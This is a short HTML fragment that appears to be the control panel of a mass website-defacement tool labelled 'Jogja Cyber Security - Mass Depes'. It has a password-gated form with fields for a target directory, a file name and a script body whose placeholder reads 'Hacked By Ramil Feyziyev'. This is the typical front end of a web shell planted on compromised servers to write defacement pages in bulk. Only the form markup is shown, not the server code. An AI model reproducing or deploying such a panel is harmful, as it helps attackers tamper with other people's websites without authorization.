		...
		<body>
				<center>
					<font face="Orbitron"><font size="7" class="anu1">Jogja Cyber Security - Mass Depes</font><br><br>
							<form method="post" action="?pw=bala&action">
							<input type="text" name="dir" placeholder="Dir" class="td">
							<input type="text" name="nama" placeholder="1.txt"  class="td"><br><br>
							<textarea rows="10" cols="19px" name="script" placeholder="Hacked By Ramil Feyziyev"  class="td"></textarea>
